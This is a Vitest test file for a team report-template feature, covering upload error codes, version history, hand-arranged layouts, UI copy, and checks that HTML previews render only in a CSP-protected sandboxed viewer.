  it("hands a 413 refused on size and a checker that could not run to the panel by their codes", async () => {
    vi.stubGlobal("fetch", vi.fn(async () => json(413, { code: "too_large",
      reason: "The request is larger than this action accepts (10 MB).",
      detail: "The request is larger than this action accepts (10 MB)." })));
    const big = await mrReadTemplateSample(new File(["x"], "big.pdf")).catch((x: unknown) => x);
    expect([apiCode(big), readFailure(apiCode(big), 413)]).toEqual(["too_large", "upload"]);
    expect((big as Error).message).toBe("The request is larger than this action accepts (10 MB).");

    vi.stubGlobal("fetch", vi.fn(async () => json(503, { code: "check_unavailable",
      reason: "The template checker could not run just now, so the file was not checked and nothing was saved. Try again in a minute.",
      detail: "The template checker could not run just now, so the file was not checked and nothing was saved. Try again in a minute." })));
    const down = await mrReadTemplateSample(new File(["<p></p>"], "t.html")).catch((x: unknown) => x);
    expect([apiCode(down), readFailure(apiCode(down), 503)]).toEqual(["check_unavailable", "check"]);
  });

  it("carries a coded refusal's code and fields to the screen", async () => {
    vi.stubGlobal("fetch", vi.fn(async () => json(503, {
      code: "timeout", reason: "The AI reader did not answer within 150 seconds.",
      detail: "The AI reader did not answer within 150 seconds.", billed: true, readings_left_today: 9 })));
    const e = await mrReadTemplateSample(new File(["%PDF-1.7"], "a.pdf")).catch((x: unknown) => x);
    expect(apiCode(e)).toBe("timeout");
    expect(apiBody(e).billed).toBe(true);
    expect(apiBody(e).readings_left_today).toBe(9);
    expect((e as Error).message).toBe("The AI reader did not answer within 150 seconds.");
  });

  it("sends the file as multipart 'file' to the one extract route — the server decides its kind", async () => {
    const fetchMock = vi.fn(async (_url: string, _init?: RequestInit) => json(200, {
      source_kind: "html", errors: [], removed: {}, placeholders_used: [], can_save: true,
      sanitized_html: "<p>{{total_spend}}</p>", upload: {}, preview_html: "<p>$2,737</p>",
      preview_unavailable_reason: null }));
    vi.stubGlobal("fetch", fetchMock);
    const r = await mrReadTemplateSample(new File(["<p>{{total_spend}}</p>"], "ours.html"));
    expect(r.source_kind).toBe("html");
    const [url, init] = fetchMock.mock.calls[0];
    expect(String(url)).toMatch(/\/api\/mr\/report-templates\/extract$/);
    expect((init?.body as FormData).get("file")).toBeInstanceOf(File);
  });
});

describe("building with the team's template", () => {
  afterEach(() => { vi.unstubAllGlobals(); });

  it("sends template: 'builtin' only when asked, and never otherwise", async () => {
    const fetchMock = vi.fn(async (_url: string, _init?: RequestInit) =>
      json(200, { id: "r", kind: "vendor_report", generated_at: "x", structured: {} }));
    vi.stubGlobal("fetch", fetchMock);
    await mrBuildVendorReport("2026-09");
    await mrBuildVendorReport("2026-09", { builtin: true });
    expect(JSON.parse(String(fetchMock.mock.calls[0][1]?.body))).toEqual({ year_month: "2026-09" });
    expect(JSON.parse(String(fetchMock.mock.calls[1][1]?.body)))
      .toEqual({ year_month: "2026-09", template: "builtin" });
  });

  it("hands the 409 template_failed to the band by its code", async () => {
    vi.stubGlobal("fetch", vi.fn(async () => json(409, {
      code: "template_failed", reason: "This template can't be rendered: it broke.",
      detail: "This template can't be rendered: it broke.", can_use_builtin: true,
      template: { kind: "layout", number: 1, id: "tv_1" } })));
    const e = await mrBuildVendorReport("2026-09").catch((x: unknown) => x);
    expect(apiCode(e)).toBe("template_failed");
    expect(apiBody(e).can_use_builtin).toBe(true);
  });
});

describe("saving, switching and the starter file", () => {
  afterEach(() => { vi.restoreAllMocks(); vi.unstubAllGlobals(); });

  it("reads the saved version back", async () => {
    const v = { ...LISTING.versions[0], number: 5, id: "tv_5" };
    vi.stubGlobal("fetch", vi.fn(async () => json(200, { version: v, active: v })));
    expect((await mrSaveTemplate({ source_kind: "builder", layout: { sections: [] } }))?.number).toBe(5);
  });

  it("switches by id, and to the built-in by the literal 'builtin'", async () => {
    const fetchMock = vi.fn(async (_url: string, _init?: RequestInit) =>
      json(200, { active: { id: "builtin", kind: "builtin", number: null } }));
    vi.stubGlobal("fetch", fetchMock);
    expect((await mrActivateTemplate("builtin"))?.kind).toBe("builtin");
    await mrActivateTemplate("tv/1");
    expect(String(fetchMock.mock.calls[0][0])).toMatch(/\/api\/mr\/report-templates\/builtin\/activate$/);
    expect(String(fetchMock.mock.calls[1][0])).toMatch(/\/report-templates\/tv%2F1\/activate$/);
  });

  it("reads one version's sections from its layout route", async () => {
    const fetchMock = vi.fn(async (_url: string, _init?: RequestInit) =>
      json(200, { id: "tv_1", kind: "layout", number: 1, layout: LAYOUT }));
    vi.stubGlobal("fetch", fetchMock);
    const got = await mrTemplateLayout("tv_1");
    expect(String(fetchMock.mock.calls[0][0])).toMatch(/\/api\/mr\/report-templates\/tv_1\/layout$/);
    expect([got.id, got.kind, got.number]).toEqual(["tv_1", "layout", 1]);
    expect(got.layout.sections.map((s) => s.type)).toEqual(["header", "vendor_scorecard", "data_gaps"]);
    expect(got.layout.theme).toEqual({ colors: { ink: "#101010" } });
  });

  it("hands the layout route's refusals to the panel by code, and refuses an empty answer", async () => {
    vi.stubGlobal("fetch", vi.fn(async () => json(422, { code: "not_a_layout",
      reason: "Version 2 is an HTML template; it has no section layout to arrange.",
      detail: "Version 2 is an HTML template; it has no section layout to arrange." })));
    expect(apiCode(await mrTemplateLayout("tv_2").catch((x: unknown) => x))).toBe("not_a_layout");
    vi.stubGlobal("fetch", vi.fn(async () => json(404, { code: "not_found", reason: "x", detail: "x" })));
    expect(apiCode(await mrTemplateLayout("nope").catch((x: unknown) => x))).toBe("not_found");
    vi.stubGlobal("fetch", vi.fn(async () => json(200, { id: "tv_1", kind: "layout", layout: { sections: [] } })));
    await expect(mrTemplateLayout("tv_1")).rejects.toThrow(/nothing to arrange/);
  });

  it("saves the starter as bytes a browser cannot render — never as HTML in this origin", async () => {
    const made: Blob[] = [];
    vi.spyOn(URL, "createObjectURL").mockImplementation((b) => { made.push(b as Blob); return "blob:x"; });
    vi.stubGlobal("fetch", vi.fn(async () => new Response("<!DOCTYPE html><script>x</script>",
      { status: 200, headers: { "Content-Type": "text/html; charset=utf-8" } })));
    expect(await mrTemplateStarterFileUrl()).toBe("blob:x");
    expect(made).toHaveLength(1);
    expect(made[0].type).toBe("application/octet-stream");
  });
});

/* --------------------------------------------------------------------------
   Team report templates: what the panel decides.
   -------------------------------------------------------------------------- */

describe("templateBandLine", () => {
  const at = new Date(2026, 9, 3, 14, 20).toISOString();

  const line = (over: Partial<MrTemplateLine>): MrTemplateLine =>
    ({ kind: "layout", number: 4, set_by: null, set_by_name: null, set_at: null, ...over });

  it("says the built-in — also for a backend that does not say", () => {
    expect(templateBandLine(null)).toBe("The team's reports use the built-in template.");
    expect(templateBandLine(line({ kind: "builtin", number: null })))
      .toBe("The team's reports use the built-in template.");
  });

  it("names the version, who set it by name, and when — the spec's line", () => {
    expect(templateBandLine(line({ set_by: "priya@legalsoft.com", set_by_name: "Priya Shah", set_at: at })))
      .toBe("The team's reports use version 4, set by Priya Shah on 3 Oct 2026.");
    // A backend older than names: the email stands in.
    expect(templateBandLine(line({ set_by: "priya@legalsoft.com", set_at: at })))
      .toBe("The team's reports use version 4, set by priya@legalsoft.com on 3 Oct 2026.");
    // The reader is "you", whatever their name is.
    expect(templateBandLine(line({ kind: "html", set_by: "me@legalsoft.com", set_by_name: "Me Myself", set_at: at }),
      "ME@legalsoft.com")).toBe("The team's reports use version 4, set by you on 3 Oct 2026.");
    expect(templateBandLine(line({}))).toBe("The team's reports use version 4.");
  });

  it("never claims the built-in when the server could not read its store", () => {
    expect(templateBandLine(line({ kind: null, number: null })))
      .toBe("Which template the team's reports use could not be read just now.");
  });
});

describe("readFailure — a sample's refusal, chosen by its code", () => {
  it("puts the day's limit apart, calm", () => {
    expect(readFailure("rate_limited", 429)).toBe("limit");
    expect(readFailure(null, 429)).toBe("limit");
  });

  it("puts every reader code with the reader", () => {
    for (const code of ["no_key", "offline", "provider_error", "timeout", "refused", "truncated", "invalid_output"]) {
      expect(readFailure(code, code.startsWith("re") || code.startsWith("tr") || code.startsWith("in") ? 502 : 503), code)
        .toBe("reader");
    }
  });

  it("puts every upload code with the file", () => {
    for (const code of ["invalid_file", "unreadable", "encrypted", "too_large", "too_many_pages",
                        "cost_ceiling", "nothing_matched", "not_html"]) {
      expect(readFailure(code, 422), code).toBe("upload");
    }
  });

  it("places a code it has never seen by its status, and no reply at all with the reader", () => {
    expect(readFailure("something_new", 502)).toBe("reader");
    expect(readFailure("something_new", 422)).toBe("upload");
    expect(readFailure(null, null)).toBe("reader");
  });

  it("keeps a checker that could not run apart from the AI reader — it is not 'couldn't read your sample'", () => {
    expect(readFailure("check_unavailable", 503)).toBe("check");
  });

  it("treats the 413 refused on size, before auth, as the file's — shown with the server's reason", () => {
    expect(readFailure("too_large", 413)).toBe("upload");
  });
});

describe("the readings and the limit", () => {
  it("counts down only from three, and never says zero", () => {
    expect(readingsLeftLine(10)).toBeNull();
    expect(readingsLeftLine(4)).toBeNull();
    expect(readingsLeftLine(3)).toBe("3 sample readings left today for the team.");
    expect(readingsLeftLine(1)).toBe("1 sample reading left today for the team.");
    expect(readingsLeftLine(0)).toBeNull();
    expect(readingsLeftLine(null)).toBeNull();
  });

  it("says the spec's sentence in full — arranging by hand always has somewhere to start now", () => {
    expect(rateLimitedLine(10)).toBe(
      "The team has used today's 10 sample readings. Try again tomorrow; HTML templates and arranging by hand work now.");
    expect(rateLimitedLine(null)).toBe(
      "The team has used today's sample readings. Try again tomorrow; HTML templates and arranging by hand work now.");
  });
});

describe("an HTML template, checked", () => {
  it("says the spec's sentence when only scripts went", () => {
    expect(removedLine({ scripts: 1 })).toBe("We removed 1 script. Templates can't run code; everything else is kept.");
  });

  it("names everything else that went, so 'everything else is kept' stays true", () => {
    expect(removedLine({ scripts: 2, handlers: 1, external_urls: 3 })).toBe(
      "We removed 2 scripts, 1 event handler and 3 outside addresses. Templates can't run code or load anything from outside; everything else is kept.");
  });

  it("says nothing for comments alone", () => {
    expect(removedLine({ comments: 4 })).toBeNull();
    expect(removedLine({})).toBeNull();
  });

  it("heads placeholder problems with the spec's line, and anything else plainly", () => {
    const ph = { line: 14, placeholder: "{{totl_spend}}", message: "x", suggestion: "{{total_spend}}" };
    expect(problemsHeading([ph, { ...ph, line: 20 }]))
      .toBe("2 placeholders aren't recognised, so this template can't be saved.");
    expect(problemsHeading([ph])).toBe("1 placeholder isn't recognised, so this template can't be saved.");
    expect(problemsHeading([ph, { line: null, placeholder: null, message: "No placeholders.", suggestion: null }]))
      .toBe("2 problems stop this template from being saved.");
  });

  it("writes a row the spec's way", () => {
    expect(problemParts({ line: 14, placeholder: "{{totl_spend}}", message: "unknown", suggestion: "{{total_spend}}" }))
      .toEqual({ line: "Line 14", placeholder: "{{totl_spend}}", text: "Did you mean {{total_spend}}?" });
    expect(problemParts({ line: null, placeholder: null, message: "This file uses no placeholders.", suggestion: null }))
      .toEqual({ line: null, placeholder: null, text: "This file uses no placeholders." });
  });
});

describe("matchedLine", () => {
  it("is the spec's sentence", () => {
    expect(matchedLine(6, "September 2026")).toBe("We matched 6 sections. Here they are with your September 2026 figures.");
    expect(matchedLine(1, null)).toBe("We matched 1 section.");
  });
});

describe("the version history", () => {
  const listing = readTemplateListing(LISTING);

  it("lists saved versions newest first and pins the built-in last", () => {
    const rows = historyRows(listing);
    expect(rows.map((r) => r.id)).toEqual(["tv_1", "builtin"]);
    expect(rows.map((r) => [versionLabel(r), madeFrom(r), r.active])).toEqual([
      ["Version 1", "Sample: Q3 sample.pdf", true],
      ["Built-in", "Built in", false],
    ]);
  });

  it("says how each version was made", () => {
    const v = (source_kind: string, filename: string | null) =>
      ({ kind: "layout", source_kind, filename }) as Pick<MrTemplateVersion, "kind" | "source_kind" | "filename">;
    expect(madeFrom(v("image", "board.png"))).toBe("Sample: board.png");
    expect(madeFrom(v("html", "ours.html"))).toBe("HTML: ours.html");
    expect(madeFrom(v("builder", null))).toBe("Arranged by hand");
  });

  it("marks the built-in in use when the team switched back to it, and says who did, by name", () => {
    const back = readTemplateListing({ ...LISTING, active: { id: "builtin", kind: "builtin",
      set_by: "rahul@legalsoft.com", set_by_name: "Rahul Mehta",
      set_at: new Date(2026, 9, 5, 10).toISOString() },
      versions: [{ ...LISTING.versions[0], active: false }] });
    const rows = historyRows(back);
    expect(rows.map((r) => r.active)).toEqual([false, true]);
    expect(setByLine(rows[1])).toBe("Set by Rahul Mehta on 5 Oct");
  });

  it("adds 'Set by' under In use only for a version switched back to, not one just saved", () => {
    const saved = historyRows(listing)[0];
    expect(setByLine(saved)).toBeNull();
    const reverted: MrTemplateVersion = { ...saved, set_by: "rahul@legalsoft.com",
      set_by_name: "Rahul Mehta", set_at: new Date(2026, 9, 5, 10).toISOString() };
    expect(setByLine(reverted)).toBe("Set by Rahul Mehta on 5 Oct");
    expect(setByLine(reverted, "rahul@legalsoft.com")).toBe("Set by you on 5 Oct");
    expect(setByLine({ ...reverted, set_by_name: null })).toBe("Set by rahul@legalsoft.com on 5 Oct");
  });

  it("names who made each version: their name, the email when there is none, 'you' for the reader", () => {
    const v = historyRows(listing)[0];
    expect(madeBy(v)).toBe("Priya Shah");
    expect(madeBy({ ...v, created_by_name: null })).toBe("priya@legalsoft.com");
    expect(madeBy(v, "Priya@LegalSoft.com")).toBe("you");
    expect(madeBy(historyRows(listing)[1])).toBe("—");            // the built-in: nobody made it
  });

  it("says the switch the spec's way", () => {
    expect(switchedLine({ kind: "layout", number: 2 })).toBe("Switched to version 2. The team's next report will use it.");
    expect(switchedLine({ kind: "builtin", number: null }))
      .toBe("Switched to the built-in template. The team's next report will use it.");
  });
});

describe("arranging by hand", () => {
  const placeholders = readTemplateListing(LISTING).placeholders;
  const types = sectionTypes(placeholders);
  const layout = { theme: { colors: { ink: "#101010" } }, sections: [
    { type: "header", title: null, options: {} },
    { type: "vendor_scorecard", title: null, options: { show_new_this_period: false } },
    { type: "data_gaps", title: null, options: {} },
  ] };

  it("reads the section types off the block placeholders, and their names from each one's title", () => {
    expect(types).toEqual(["header", "benchmark_movers", "vendor_scorecard", "standouts", "data_gaps", "footer"]);
    const titles = sectionTitles(placeholders);
    expect(titles.benchmark_movers).toBe("Biggest movers vs. benchmark");
    expect(titles.data_gaps).toBe("Basis & data gaps");
  });

  it("never parses a description for a name — a title, or the key spelled out", () => {
    const p = (title: string | null): MrTemplatePlaceholder => ({
      token: "{{chart:new_thing}}", title, kind: "chart", example: null,
      description: "Something Else Entirely: a chart drawn from this report" });
    expect(sectionTitles([p("Real name")]).new_thing).toBe("Real name");
    expect(sectionTitles([p(null)]).new_thing).toBe("New thing");
    expect(sourceOf("./templateModel.ts")).not.toContain("drawn from this report$");
  });

  it("pins the header and footer, lists the sample's own sections shown and every other one hidden", () => {
    const a = arrange(layout, types);
    expect(a.top.map((r) => r.type)).toEqual(["header"]);
    expect(a.bottom.map((r) => r.type)).toEqual(["data_gaps", "footer"]);
    expect(a.rows.map((r) => [r.type, r.shown])).toEqual([
      ["vendor_scorecard", true], ["benchmark_movers", false], ["standouts", false]]);
  });

  it("gives back the theme and every option untouched — the UI reorders, hides and renames only", () => {
    const out = layoutOf(arrange(layout, types));
    expect(out.theme).toEqual({ colors: { ink: "#101010" } });
    expect(out.sections).toEqual([
      { type: "header", title: null, options: {} },
      { type: "vendor_scorecard", title: null, options: { show_new_this_period: false } },
      { type: "data_gaps", title: null, options: {} },
      { type: "footer", title: null, options: {} },
    ]);
  });

  it("moves, shows, hides and renames — and leaves hidden sections out of the layout", () => {
    let a = arrange(layout, types);
    const movers = a.rows.find((r) => r.type === "benchmark_movers")!.key;
    const card = a.rows.find((r) => r.type === "vendor_scorecard")!.key;
    a = showRow(a, movers, true);
    a = moveRow(a, movers, -1);
    a = renameRow(a, card, "  Who did what  ");
    expect(layoutOf(a).sections.map((s) => [s.type, s.title])).toEqual([
      ["header", null], ["benchmark_movers", null], ["vendor_scorecard", "Who did what"],
      ["data_gaps", null], ["footer", null]]);
    a = showRow(a, card, false);
    expect(layoutOf(a).sections.map((s) => s.type)).toEqual(["header", "benchmark_movers", "data_gaps", "footer"]);
    a = renameRow(a, card, "");
    expect(a.rows.find((r) => r.key === card)!.title).toBeNull();
  });

  it("does nothing past either end, and drops a dragged row into its target's place", () => {
    const a = arrange(layout, types);
    expect(moveRow(a, a.rows[0].key, -1)).toBe(a);
    expect(moveRow(a, a.rows[a.rows.length - 1].key, 1)).toBe(a);
    const moved = moveRowTo(a, a.rows[2].key, a.rows[0].key);
    expect(moved.rows.map((r) => r.type)).toEqual(["standouts", "vendor_scorecard", "benchmark_movers"]);
  });

  it("knows when an arrangement renders exactly what the sample did — and when pinning added a section", () => {
    const a = arrange(layout, types);
    expect(sameLayout(layoutOf(a), layout)).toBe(false);          // the footer was added
    const full = { sections: [...layout.sections, { type: "footer", title: null, options: {} }] };
    expect(sameLayout(layoutOf(arrange(full, types)), full)).toBe(true);
  });

  it("always has somewhere to start: the built-in, the layout version in use, or the built-in for HTML", () => {
    const active = readTemplateListing(LISTING).active!;
    expect(handPlan(null)).toEqual({ from: "builtin", note: null });
    expect(handPlan({ ...active, id: "builtin", kind: "builtin", number: null }))
      .toEqual({ from: "builtin", note: null });
    // A layout version in use: its own sections, through the layout route.
    expect(handPlan(active)).toEqual({ from: "version", id: "tv_1" });
    // An HTML version has no sections: the built-in's, said in one quiet line.
    expect(handPlan({ ...active, kind: "html", number: 3 })).toEqual({ from: "builtin",
      note: "Version 3 is an HTML template, which has no sections to arrange, so this starts from the built-in layout." });
  });
});

describe("a missing preview, by its code", () => {
  const p = (code: string | null, html: string | null = null): MrTemplatePreview => ({
    preview_html: html, preview_unavailable_reason: html ? null : "The reason, from the server.",
    preview_unavailable_code: code });

  it("holds Save only when THIS template does not render", () => {
    expect(previewHoldsSave(p("template_failed"))).toBe(true);
    expect(previewHoldsSave(p("no_data"))).toBe(false);
    expect(previewHoldsSave(p("store_unavailable"))).toBe(false);
    // A backend older than the code: no guess — Save stays open, the server re-checks.
    expect(previewHoldsSave(p(null))).toBe(false);
    expect(previewHoldsSave(p(null, "<!DOCTYPE html>"))).toBe(false);
  });

  it("says the spec's sentence for a template that fails, and the server's reason otherwise", () => {
    expect(noPreviewLine(p("template_failed"))).toBe(
      "This template doesn't render with your figures: The reason, from the server. It can't be saved as it is.");
    expect(noPreviewLine(p("no_data"))).toBe(
      "There's no preview: The reason, from the server. You can still save it — it is checked again when you do.");
    expect(noPreviewLine(p("store_unavailable"))).toBe(
      "There's no preview: The reason, from the server. You can still save it — it is checked again when you do.");
    expect(noPreviewLine(p(null, "<!DOCTYPE html>"))).toBeNull();
  });
});

describe("the template panel's own words and wiring", () => {
  const panel = () => sourceOf("./Templates.tsx");

  it("shows every preview in the sandboxed viewer and nothing else", () => {
    expect(panel()).toContain("<ReportFrame html={preview.preview_html}");
    expect(panel()).not.toMatch(/<iframe\b|srcDoc|dangerouslySetInnerHTML|window\.open\(|createObjectURL/);
    expect(panel()).not.toMatch(/innerHTML/);
  });

  it("chooses every state by the reply's code, never its wording", () => {
    expect(panel()).toContain("readFailure(apiCode(e), apiStatus(e))");
    expect(panel()).toContain('code === "template_invalid"');
    expect(panel()).not.toMatch(/(message|reason)\.(includes|startsWith|match)\(/);
  });

  it("gates nothing on a role — any member may read, save and switch", () => {
    expect(panel()).not.toMatch(/is_admin|is_creator|mayEdit|mrDataActions/);
  });

  it("carries the spec's copy", () => {
    for (const line of [
      "Drop a sample report here, or choose a file",
      "A PDF or picture of a report you like. We match its sections, order, colours\n                    and fonts to the figures we have.",
      "Upload a sample report",
      "Arrange sections by hand",
      "Use built-in template",
      "Earlier versions ({data.versions.length})",
      "Building your own HTML template",
      "Download starter HTML",
      "Reading ${step.file.name}. This takes a few seconds",
      "Every section in your sample was matched.",
      "Not supported yet ({items.length})",
      "We couldn't read your sample.",
      ". Nothing was saved.",
      "Fix the file and upload it again to see the preview.",
      "Upload the fixed file",
      "This template doesn't render with your figures: ",
      ". It can't be saved as it is.",
      "Save this template for the whole team?",
      "Save for the whole team",
      "Discard",
      "Switch to this",
      "In use",
      '"Copied"',
      "Saved as version ${version.number}. The team's next report will use it.",
      "Always shown",
    ]) expect(panel(), line).toContain(line);
    expect(panel()).toMatch(/From the next report on, every Vendor Performance report anyone on the team builds will\s+use it\. Reports already built won't change\. You can switch back to any earlier version\./);
    expect(panel()).toMatch(/Your sample has these, but we have no figures for them, so they're left out rather than\s+made up\./);
  });

  it("always offers arranging by hand, starting where handPlan says", () => {
    // Both places it is offered — the first screen, and the way on when the
    // reader fails — call the one function, with no guard in front.
    expect(panel().match(/onClick=\{\(\) => void arrangeByHand\(\)\}/g)).toHaveLength(2);
    expect(panel().match(/>\s*Arrange sections by hand\s*</g)).toHaveLength(2);
    expect(panel()).not.toMatch(/handStart|\{start && \(/);
    expect(panel()).toContain("const plan = handPlan(data.active);");
    expect(panel()).toContain('mrTemplateLayout(plan.from === "version" ? plan.id : "builtin")');
    expect(panel()).toContain('if (apiCode(e) === "not_a_layout" && data.default_layout)');
    expect(panel()).toContain('{step.note && <p className="calm" role="note">{step.note}</p>}');
    expect(panel()).toContain("rateLimitedLine(data.readings_per_day)");
  });

  it("puts the confirmation in front of every save, and holds it only on the preview's code", () => {
    expect(panel()).toMatch(/onSave=\{\(\) => setConfirming\(true\)\}/);
    expect(panel()).toMatch(/onClick=\{\(\) => setConfirming\(true\)\}/);
    expect(panel()).not.toMatch(/onClick=\{\(\) => void save\(\)\}/);
    expect(panel()).toContain("<ConfirmSave saving={saving}");
    expect(panel()).toContain("disabled={saving || arrangeKey !== step.previewKey || previewHoldsSave(step.preview)}");
    expect(panel()).toContain("disabled={previewHoldsSave(check)}");
    // The guess from figures being on file is gone.
    expect(panel()).not.toMatch(/examples_from !== null|haveFigures/);
  });

  it("shows a checker that could not run as an honest Oops with Try again — nothing was saved", () => {
    expect(panel()).toMatch(/\} else if \(failure === "check"\) \{\s*setStep\(\{ kind: "check", file, reason: message \}\);/);
    expect(panel()).toMatch(/\{step\.kind === "check" && \([\s\S]{0,120}<Oops\s+what="We couldn't check your template, so nothing was saved\."\s+error=\{step\.reason\}\s+onRetry=\{\(\) => void read\(step\.file\)\}/);
    // On save, the same: an Oops whose Try again sends the same save.
    expect(panel()).toContain('} else if (code === "check_unavailable") {');
    expect(panel()).toMatch(/saveError\.tone === "check" \? \(\s*<Oops\s+what="We couldn't check your template, so nothing was saved\."\s+error=\{saveError\.text\}\s+onRetry=\{\(\) => void save\(\)\}/);
  });

  it("shows the server's own reason for a 413 too_large, on reading and on saving", () => {
    // Reading: readFailure puts it with the file, and the step prints the reason.
    expect(panel()).toContain('setStep({ kind: "upload", reason: message, unsupported });');
    expect(panel()).toContain('<p className="calm" role="status">{step.reason}</p>');
    // Saving: the reason, then "Nothing was saved."
    expect(panel()).toMatch(/code === "invalid_layout" \|\| code === "invalid_template" \|\| code === "too_large"\) \{[\s\S]{0,260}text: `\$\{clause\(reason\)\}\. Nothing was saved\.`/);
  });

  it("names people the spec's way — by name, the email when there is none, 'you' for the reader", () => {
    expect(panel()).toContain("<td className=\"dim\">{madeBy(v, me)}</td>");
    expect(panel()).toContain("const setBy = setByLine(v, me);");
  });

  it("lists each placeholder by its title", () => {
    expect(panel()).toContain("{p.title && <b>{p.title}</b>}");
  });

  it("gives a section's title field the whole first line of its row, and keeps focus order visual", () => {
    // Squeezed beside Show and the moves, it was ~150px: "Budget allocation vs. sp".
    const css = sourceOf("../../../../app/hub-live.css");
    expect(css).toContain('grid-template-areas: "grip title title" ". show move";');
    expect(css).toContain(".tsec__r > .tsec__in { grid-area: title; width: 100%; }");
    const row = panel().slice(panel().indexOf('className="tsec__g"'), panel().indexOf('className="tsec__mv"'));
    expect(row.indexOf('className="inp tsec__in"')).toBeLessThan(row.indexOf('className="tsec__show"'));
  });

  it("never paints the daily limit or a placeholder problem red", () => {
    expect(panel()).toMatch(/readingsLeft === 0 \? \(\s*<p className="calm" role="status">\{rateLimitedLine/);
    expect(panel()).toMatch(/<div className="cov">\s*<p className="cov__n">\{problemsHeading/);
  });
});

/* --------------------------------------------------------------------------
   Security audit: an HTML check's `sanitized_html` is emitted WITHOUT the
   Content-Security-Policy, so it never reaches a frame or a page. Previews come
   only from `preview_html` (which carries the CSP), only through the shared
   sandboxed viewer.
   -------------------------------------------------------------------------- */

describe("sanitized_html is never shown", () => {
  const SENTINEL = "<p>SANITIZED-NO-CSP {{total_spend}}</p>";
  const check = readTemplateReading({
    source_kind: "html", sanitized_html: SENTINEL, errors: [], removed: {}, placeholders_used: [],
    can_save: true, upload: { filename: "t.html" },
    preview_html: '<!DOCTYPE html><html lang="en"><head><meta http-equiv="Content-Security-Policy" content="default-src \'none\'"></head><body>$2,737</body></html>',
    preview_unavailable_reason: null,
  });

  it("hands the viewer the CSP preview and nothing of the sanitized text", () => {
    const shown = previewOf(check);
    expect(Object.keys(shown).sort())
      .toEqual(["preview_html", "preview_unavailable_code", "preview_unavailable_reason"]);
    expect(JSON.stringify(shown)).not.toContain("SANITIZED-NO-CSP");
    expect(shown.preview_html).toContain("Content-Security-Policy");
  });

  it("renders the viewer from that preview only — the sentinel never reaches a frame", () => {
    const markup = renderToStaticMarkup(createElement(ReportFrame, {
      html: previewOf(check).preview_html!, title: "Preview" }));
    expect(markup).toMatch(/\ssandbox=""/);
    expect(markup).not.toContain("SANITIZED-NO-CSP");
  });

  it("uses sanitized_html in exactly one place — the body of a save, sent back to the server", () => {
    const panel = sourceOf("./Templates.tsx");
    const uses = panel.split("\n").filter((l) => l.includes("sanitized_html") && !l.trim().startsWith("//")
      && !l.trim().startsWith("*"));
    // The save body, and the type that forbids it reaching the viewer — nothing else.
    expect(uses.map((l) => l.replace(/\r$/, ""))).toEqual([
      "            html: step.check.sanitized_html ?? await step.file.text() }",
      "  preview: MrTemplatePreview & { sanitized_html?: never };",
    ]);
    // Every frame in the panel is drawn from `preview_html`, and the HTML check
    // passes the viewer `previewOf(check)`, never the check itself.
    expect(panel.match(/<ReportFrame [^>]*/g)).toEqual([
      '<ReportFrame html={preview.preview_html} title="Preview of this template with your figures" /']);
    expect(panel).toContain("<PreviewPane preview={previewOf(check)}");
    expect(panel).not.toMatch(/preview=\{check\}/);
    // The prop type itself refuses an object carrying it.
    expect(panel).toContain("preview: MrTemplatePreview & { sanitized_html?: never };");
  });

  it("is not read anywhere else in the panel's tree or the viewer", () => {
    for (const file of ["./Reports.tsx", "./reportFrame.ts", "./templateModel.ts"]) {
      const code = sourceOf(file).split("\n")
        .filter((l) => !/^\s*(\/\/|\*|\/\*\*)/.test(l)).join("\n");
      expect(code, file).not.toMatch(/\.sanitized_html|\["sanitized_html"\]/);
    }
  });
});
